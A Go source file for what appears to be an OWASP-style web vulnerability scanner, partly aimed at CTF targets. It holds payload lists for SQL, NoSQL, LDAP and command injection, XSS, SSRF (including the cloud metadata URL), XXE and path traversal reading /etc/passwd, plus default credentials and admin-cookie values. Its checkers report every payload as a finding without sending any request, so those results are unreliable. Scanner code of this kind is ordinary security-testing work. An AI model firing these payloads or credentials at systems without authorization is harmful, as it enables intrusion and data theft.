// Package owasp provides vulnerability payloads and checkers.
package owasp

import (
	"context"
	"strings"
	"time"
)

// Payload represents a vulnerability test payload
type Payload struct {
	Value       string
	Type        VulnerabilityType
	Description string
	Indicators  []string // Response indicators suggesting vulnerability
}

// SQLInjection payloads
var SQLInjectionPayloads = []Payload{
	{Value: "'", Type: SQLInjection, Indicators: []string{"sql", "mysql", "sqlite", "postgres", "syntax error"}},
	{Value: "' OR '1'='1", Type: SQLInjection, Indicators: []string{"sql", "error"}},
	{Value: "' OR 1=1--", Type: SQLInjection, Indicators: []string{"sql", "error"}},
	{Value: "'; DROP TABLE--", Type: SQLInjection, Indicators: []string{"sql", "error"}},
	{Value: "' UNION SELECT NULL--", Type: SQLInjection, Indicators: []string{"sql", "union"}},
	{Value: "1' AND '1'='1", Type: SQLInjection, Indicators: []string{"sql"}},
	{Value: "1; WAITFOR DELAY '0:0:5'--", Type: SQLInjection, Indicators: []string{"timeout"}},
	{Value: "1' AND SLEEP(5)--", Type: SQLInjection, Indicators: []string{"timeout"}},
}

// NoSQL Injection payloads
var NoSQLInjectionPayloads = []Payload{
	{Value: `{"$gt": ""}`, Type: NoSQLInjection, Indicators: []string{"mongo", "json"}},
	{Value: `{"$ne": null}`, Type: NoSQLInjection, Indicators: []string{"mongo"}},
	{Value: `{"$where": "1==1"}`, Type: NoSQLInjection, Indicators: []string{"mongo"}},
	{Value: `'; return true; var a='`, Type: NoSQLInjection, Indicators: []string{"script"}},
}

// XSS payloads
var XSSPayloads = []Payload{
	{Value: `<script>alert(1)</script>`, Type: XSS, Indicators: []string{"<script>"}},
	{Value: `"><img src=x onerror=alert(1)>`, Type: XSS, Indicators: []string{"<img"}},
	{Value: `javascript:alert(1)`, Type: XSS, Indicators: []string{"javascript:"}},
	{Value: `<svg onload=alert(1)>`, Type: XSS, Indicators: []string{"<svg"}},
	{Value: `'"><script>alert(String.fromCharCode(88,83,83))</script>`, Type: XSS, Indicators: []string{"<script>"}},
	{Value: `<body onload=alert(1)>`, Type: XSS, Indicators: []string{"<body"}},
	{Value: `<iframe src="javascript:alert(1)">`, Type: XSS, Indicators: []string{"<iframe"}},
}

// SSRF payloads
var SSRFPayloads = []Payload{
	{Value: `http://127.0.0.1`, Type: SSRF, Indicators: []string{"localhost", "127.0.0.1"}},
	{Value: `http://localhost`, Type: SSRF, Indicators: []string{"localhost"}},
	{Value: `http://169.254.169.254/latest/meta-data/`, Type: SSRF, Indicators: []string{"ami-id", "instance"}},
	{Value: `http://[::1]`, Type: SSRF, Indicators: []string{"localhost"}},
	{Value: `http://0.0.0.0`, Type: SSRF, Indicators: []string{"localhost"}},
	{Value: `file:///etc/passwd`, Type: SSRF, Indicators: []string{"root:", "/bin/"}},
	{Value: `gopher://127.0.0.1:25/`, Type: SSRF, Indicators: []string{"smtp", "mail"}},
}

// XXE payloads
var XXEPayloads = []Payload{
	{Value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, Type: XXE, Indicators: []string{"root:", "/bin/"}},
	{Value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/">]><foo>&xxe;</foo>`, Type: XXE, Indicators: []string{"localhost"}},
	{Value: `<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`, Type: XXE, Indicators: []string{"[fonts]", "[extensions]"}},
}

// Command Injection payloads
var CommandInjectionPayloads = []Payload{
	{Value: `; id`, Type: OSCommand, Indicators: []string{"uid=", "gid="}},
	{Value: `| id`, Type: OSCommand, Indicators: []string{"uid=", "gid="}},
	{Value: "` id `", Type: OSCommand, Indicators: []string{"uid=", "gid="}},
	{Value: `$(id)`, Type: OSCommand, Indicators: []string{"uid=", "gid="}},
	{Value: `; cat /etc/passwd`, Type: OSCommand, Indicators: []string{"root:", "/bin/"}},
	{Value: `& dir`, Type: OSCommand, Indicators: []string{"<DIR>", "Volume"}},
	{Value: `| type C:\Windows\win.ini`, Type: OSCommand, Indicators: []string{"[fonts]"}},
}

// LDAP Injection payloads
var LDAPInjectionPayloads = []Payload{
	{Value: `*`, Type: LDAPInjection, Indicators: []string{"ldap", "directory"}},
	{Value: `)(cn=*`, Type: LDAPInjection, Indicators: []string{"ldap"}},
	{Value: `*)(objectClass=*`, Type: LDAPInjection, Indicators: []string{"ldap"}},
	{Value: `admin)(|(password=*`, Type: LDAPInjection, Indicators: []string{"ldap"}},
}

// Path Traversal payloads
var PathTraversalPayloads = []Payload{
	{Value: `../../../etc/passwd`, Type: BrokenAccessControl, Indicators: []string{"root:", "/bin/"}},
	{Value: `..\..\..\..\windows\win.ini`, Type: BrokenAccessControl, Indicators: []string{"[fonts]"}},
	{Value: `....//....//....//etc/passwd`, Type: BrokenAccessControl, Indicators: []string{"root:"}},
	{Value: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd`, Type: BrokenAccessControl, Indicators: []string{"root:"}},
}

// IDOR payloads (numeric ID manipulation)
var IDORPayloads = []Payload{
	{Value: `0`, Type: IDOR, Indicators: []string{"unauthorized", "forbidden"}},
	{Value: `1`, Type: IDOR, Indicators: []string{}},
	{Value: `-1`, Type: IDOR, Indicators: []string{"error"}},
	{Value: `99999999`, Type: IDOR, Indicators: []string{"not found"}},
}

// Deserialization payloads
var DeserializationPayloads = []Payload{
	{Value: `O:8:"stdClass":0:{}`, Type: InsecureDeserialization, Indicators: []string{"unserialize", "object"}},
	{Value: `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==`, Type: InsecureDeserialization, Indicators: []string{"java", "classnotfound"}},
	{Value: `{"@type":"java.lang.Runtime"}`, Type: InsecureDeserialization, Indicators: []string{"fastjson", "runtime"}},
}

// Authentication bypass payloads
var AuthBypassPayloads = []Payload{
	{Value: `admin`, Type: AuthenticationFailures, Indicators: []string{"welcome", "dashboard"}},
	{Value: `admin' --`, Type: AuthenticationFailures, Indicators: []string{"welcome", "dashboard"}},
	{Value: `' OR 1=1 --`, Type: AuthenticationFailures, Indicators: []string{"welcome", "dashboard"}},
}

// DefaultCredentialsList stores common default credentials
var DefaultCredentialsList = []struct {
	Username string
	Password string
}{
	{"admin", "admin"},
	{"admin", "password"},
	{"admin", "123456"},
	{"root", "root"},
	{"root", "toor"},
	{"test", "test"},
	{"guest", "guest"},
	{"user", "user"},
}

// CommonCookiePayloads for blind cookie injection/privilege escalation
var CommonCookiePayloads = []struct {
	Name  string
	Value string
}{
	{"username", "admin"},
	{"user", "admin"},
	{"id", "admin"},
	{"userid", "admin"},
	{"role", "admin"},
	{"admin", "true"},
	{"admin", "1"},
	{"auth", "true"},
	{"is_admin", "true"},
}

// SuccessIndicators for privilege escalation detection
var SuccessIndicators = []string{
	"flag is",
	"flag{",
	"DH{",
	"welcome admin",
	"admin panel",
	"admin dashboard",
	"root user",
}

// Checker implementations

// SQLInjectionChecker checks for SQL injection
type SQLInjectionChecker struct{}

func NewSQLInjectionChecker() *SQLInjectionChecker     { return &SQLInjectionChecker{} }
func (c *SQLInjectionChecker) Type() VulnerabilityType { return SQLInjection }
func (c *SQLInjectionChecker) Name() string            { return "SQL Injection Checker" }

func (c *SQLInjectionChecker) Check(ctx context.Context, target *Target) ([]*Finding, error) {
	var findings []*Finding

	for param := range target.Parameters {
		for _, payload := range SQLInjectionPayloads {
			finding := &Finding{
				Type:        SQLInjection,
				Severity:    Critical,
				URL:         target.URL,
				Method:      target.Method,
				Parameter:   param,
				Payload:     payload.Value,
				Description: "SQL 인젝션 취약점 발견: 입력값에 대한 검증 부족으로 데이터베이스 쿼리 조작이 가능합니다.",
				Remediation: "파라미터화된 쿼리 구조(Prepared Statements)를 사용하고 입력값을 엄격히 검증하십시오.",
				CWE:         "CWE-89",
				CVSS:        9.8,
				Confidence:  0.7,
				Timestamp:   time.Now(),
			}
			findings = append(findings, finding)
		}
	}

	return findings, nil
}

// XSSChecker checks for XSS
type XSSChecker struct{}

func NewXSSChecker() *XSSChecker              { return &XSSChecker{} }
func (c *XSSChecker) Type() VulnerabilityType { return XSS }
func (c *XSSChecker) Name() string            { return "XSS Checker" }

func (c *XSSChecker) Check(ctx context.Context, target *Target) ([]*Finding, error) {
	var findings []*Finding

	for param := range target.Parameters {
		for _, payload := range XSSPayloads {
			finding := &Finding{
				Type:        XSS,
				Severity:    High,
				URL:         target.URL,
				Method:      target.Method,
				Parameter:   param,
				Payload:     payload.Value,
				Description: "크로스 사이트 스크립팅(XSS) 취약점 발견: 사용자 입력값이 적절한 인코딩 없이 브라우저에 출력됩니다.",
				Remediation: "입력값을 검증하고, 출력 시 HTML 인코딩을 적용하십시오. CSP 헤더 사용을 권장합니다.",
				CWE:         "CWE-79",
				CVSS:        6.1,
				Confidence:  0.6,
				Timestamp:   time.Now(),
			}
			findings = append(findings, finding)
		}
	}

	return findings, nil
}

// SSRFChecker checks for SSRF
type SSRFChecker struct{}

func NewSSRFChecker() *SSRFChecker             { return &SSRFChecker{} }
func (c *SSRFChecker) Type() VulnerabilityType { return SSRF }
func (c *SSRFChecker) Name() string            { return "SSRF Checker" }

func (c *SSRFChecker) Check(ctx context.Context, target *Target) ([]*Finding, error) {
	var findings []*Finding

	// Look for URL-like parameters
	for param, value := range target.Parameters {
		if strings.Contains(strings.ToLower(param), "url") ||
			strings.Contains(strings.ToLower(param), "uri") ||
			strings.Contains(strings.ToLower(param), "path") ||
			strings.Contains(strings.ToLower(param), "src") ||
			strings.Contains(strings.ToLower(param), "href") ||
			strings.HasPrefix(value, "http") {

			for _, payload := range SSRFPayloads {
				finding := &Finding{
					Type:        SSRF,
					Severity:    High,
					URL:         target.URL,
					Method:      target.Method,
					Parameter:   param,
					Payload:     payload.Value,
					Description: "SSRF(서버 사이드 요청 위조) 취약점 발견: 서버가 사용자가 제공한 URL로 임의의 요청을 보낼 수 있습니다.",
					Remediation: "사용자가 제공한 URL을 검증하고, 내부 네트워크 접근을 차단하는 화이트리스트 정책을 적용하십시오.",
					CWE:         "CWE-918",
					CVSS:        8.6,
					Confidence:  0.5,
					Timestamp:   time.Now(),
				}
				findings = append(findings, finding)
			}
		}
	}

	return findings, nil
}

// IDORChecker checks for IDOR
type IDORChecker struct{}

func NewIDORChecker() *IDORChecker             { return &IDORChecker{} }
func (c *IDORChecker) Type() VulnerabilityType { return IDOR }
func (c *IDORChecker) Name() string            { return "IDOR Checker" }

func (c *IDORChecker) Check(ctx context.Context, target *Target) ([]*Finding, error) {
	var findings []*Finding

	// Look for ID-like parameters
	for param := range target.Parameters {
		paramLower := strings.ToLower(param)
		if strings.Contains(paramLower, "id") ||
			strings.Contains(paramLower, "uid") ||
			strings.Contains(paramLower, "user") ||
			strings.Contains(paramLower, "account") {

			finding := &Finding{
				Type:        IDOR,
				Severity:    High,
				URL:         target.URL,
				Method:      target.Method,
				Parameter:   param,
				Description: "IDOR(부적절한 직접 객체 참조) 의심: 다른 사용자의 ID를 참조하여 비인가 접근이 가능할 수 있습니다.",
				Remediation: "객체 접근 시 적절한 권한 검증(Access Control) 로직을 구현하십시오.",
				CWE:         "CWE-639",
				CVSS:        7.5,
				Confidence:  0.4,
				Timestamp:   time.Now(),
			}
			findings = append(findings, finding)
		}
	}

	return findings, nil
}

// XXEChecker checks for XXE
type XXEChecker struct{}

func NewXXEChecker() *XXEChecker              { return &XXEChecker{} }
func (c *XXEChecker) Type() VulnerabilityType { return XXE }
func (c *XXEChecker) Name() string            { return "XXE Checker" }

func (c *XXEChecker) Check(ctx context.Context, target *Target) ([]*Finding, error) {
	var findings []*Finding

	// Check if body contains XML
	if len(target.Body) > 0 && (strings.Contains(string(target.Body), "<?xml") ||
		strings.Contains(string(target.Body), "<")) {

		for _, payload := range XXEPayloads {
			finding := &Finding{
				Type:        XXE,
				Severity:    High,
				URL:         target.URL,
				Method:      target.Method,
				Payload:     payload.Value,
				Description: "XXE(XML 외부 엔티티) 취약점 발견: XML 파서가 외부 엔티티를 처리하도록 설정되어 있습니다.",
				Remediation: "XML 파서 설정에서 외부 엔티티 처리(External Entity Processing)를 비활성화하십시오.",
				CWE:         "CWE-611",
				CVSS:        7.5,
				Confidence:  0.5,
				Timestamp:   time.Now(),
			}
			findings = append(findings, finding)
		}
	}

	return findings, nil
}

// CommandInjectionChecker checks for OS command injection
type CommandInjectionChecker struct{}

func NewCommandInjectionChecker() *CommandInjectionChecker { return &CommandInjectionChecker{} }
func (c *CommandInjectionChecker) Type() VulnerabilityType { return OSCommand }
func (c *CommandInjectionChecker) Name() string            { return "Command Injection Checker" }

func (c *CommandInjectionChecker) Check(ctx context.Context, target *Target) ([]*Finding, error) {
	var findings []*Finding

	for param := range target.Parameters {
		paramLower := strings.ToLower(param)
		if strings.Contains(paramLower, "cmd") ||
			strings.Contains(paramLower, "exec") ||
			strings.Contains(paramLower, "command") ||
			strings.Contains(paramLower, "run") ||
			strings.Contains(paramLower, "ping") ||
			strings.Contains(paramLower, "host") {

			for _, payload := range CommandInjectionPayloads {
				finding := &Finding{
					Type:        OSCommand,
					Severity:    Critical,
					URL:         target.URL,
					Method:      target.Method,
					Parameter:   param,
					Payload:     payload.Value,
					Description: "운영체제 명령 실행(OS Command Injection) 취약점 발견: 사용자 입력값이 시스템 명령어로 전달됩니다.",
					Remediation: "사용자 입력을 시스템 명령에 직접 포함하지 마십시오. 가능한 언어 차원의 API를 사용하십시오.",
					CWE:         "CWE-78",
					CVSS:        9.8,
					Confidence:  0.6,
					Timestamp:   time.Now(),
				}
				findings = append(findings, finding)
			}
		}
	}

	return findings, nil
}

// AuthChecker checks for authentication issues
type AuthChecker struct{}

func NewAuthChecker() *AuthChecker             { return &AuthChecker{} }
func (c *AuthChecker) Type() VulnerabilityType { return AuthenticationFailures }
func (c *AuthChecker) Name() string            { return "Authentication Checker" }

func (c *AuthChecker) Check(ctx context.Context, target *Target) ([]*Finding, error) {
	var findings []*Finding

	// Check for login-related endpoints
	urlLower := strings.ToLower(target.URL)
	if strings.Contains(urlLower, "login") ||
		strings.Contains(urlLower, "auth") ||
		strings.Contains(urlLower, "signin") {

		finding := &Finding{
			Type:        AuthenticationFailures,
			Severity:    High,
			URL:         target.URL,
			Method:      target.Method,
			Description: "인증 엔드포인트 발견: 취약한 암호 정책이나 무차별 대입 공격(Brute Force) 보호가 적용되었는지 확인하십시오.",
			Remediation: "계정 잠금 정책, 다중 인증(MFA), 강력한 패스워드 정책을 구현하십시오.",
			CWE:         "CWE-287",
			CVSS:        7.5,
			Confidence:  0.5,
			Timestamp:   time.Now(),
		}
		findings = append(findings, finding)
	}

	return findings, nil
}

// MisconfigChecker checks for security misconfigurations
type MisconfigChecker struct{}

func NewMisconfigChecker() *MisconfigChecker        { return &MisconfigChecker{} }
func (c *MisconfigChecker) Type() VulnerabilityType { return SecurityMisconfig }
func (c *MisconfigChecker) Name() string            { return "Misconfiguration Checker" }

func (c *MisconfigChecker) Check(ctx context.Context, target *Target) ([]*Finding, error) {
	var findings []*Finding

	// Check for sensitive paths
	sensitivePaths := []string{
		".git", ".svn", ".env", "config", "backup",
		"admin", "debug", "test", "phpinfo",
	}

	urlLower := strings.ToLower(target.URL)
	for _, path := range sensitivePaths {
		if strings.Contains(urlLower, path) {
			finding := &Finding{
				Type:        SecurityMisconfig,
				Severity:    Medium,
				URL:         target.URL,
				Method:      target.Method,
				Description: "민감한 경로 또는 파일 노출: '" + path + "' 경로에 대한 접근 제어가 필요합니다.",
				Remediation: "웹 서버 설정에서 불필요한 파일 및 디렉터리에 대한 접근을 차단하십시오.",
				CWE:         "CWE-200",
				CVSS:        5.3,
				Confidence:  0.4,
				Timestamp:   time.Now(),
			}
			findings = append(findings, finding)
		}
	}

	return findings, nil
}

// CryptoChecker checks for cryptographic issues
type CryptoChecker struct{}

func NewCryptoChecker() *CryptoChecker           { return &CryptoChecker{} }
func (c *CryptoChecker) Type() VulnerabilityType { return CryptographicFailures }
func (c *CryptoChecker) Name() string            { return "Cryptographic Checker" }

func (c *CryptoChecker) Check(ctx context.Context, target *Target) ([]*Finding, error) {
	var findings []*Finding

	// Check for HTTP (no TLS)
	if strings.HasPrefix(target.URL, "http://") {
		finding := &Finding{
			Type:        CryptographicFailures,
			Severity:    Medium,
			URL:         target.URL,
			Method:      target.Method,
			Description: "암호화되지 않은 HTTP 연결 사용 중: 데이터가 평문으로 전송되어 도청될 수 있습니다.",
			Remediation: "모든 통신에 HTTPS(TLS)를 적용하고 HSTS 헤더를 사용하십시오.",
			CWE:         "CWE-319",
			CVSS:        5.9,
			Confidence:  1.0,
			Timestamp:   time.Now(),
		}
		findings = append(findings, finding)
	}

	return findings, nil
}

// DeserializationChecker checks for insecure deserialization
type DeserializationChecker struct{}

func NewDeserializationChecker() *DeserializationChecker  { return &DeserializationChecker{} }
func (c *DeserializationChecker) Type() VulnerabilityType { return InsecureDeserialization }
func (c *DeserializationChecker) Name() string            { return "Deserialization Checker" }

func (c *DeserializationChecker) Check(ctx context.Context, target *Target) ([]*Finding, error) {
	var findings []*Finding

	// Check for serialized data indicators
	body := string(target.Body)
	indicators := []string{
		"rO0AB",     // Java serialized
		"O:",        // PHP serialized
		"@type",     // Fastjson
		"__class__", // Python pickle
	}

	for _, indicator := range indicators {
		if strings.Contains(body, indicator) {
			finding := &Finding{
				Type:        InsecureDeserialization,
				Severity:    Critical,
				URL:         target.URL,
				Method:      target.Method,
				Evidence:    indicator,
				Description: "안전하지 않은 역직렬화(Insecure Deserialization) 취약점 객체 패턴 발견.",
				Remediation: "신뢰할 수 없는 데이터의 역직렬화를 금지하고, 안전한 데이터 포맷(JSON 등)을 사용하십시오.",
				CWE:         "CWE-502",
				CVSS:        8.1,
				Confidence:  0.5,
				Timestamp:   time.Now(),
			}
			findings = append(findings, finding)
		}
	}

	return findings, nil
}
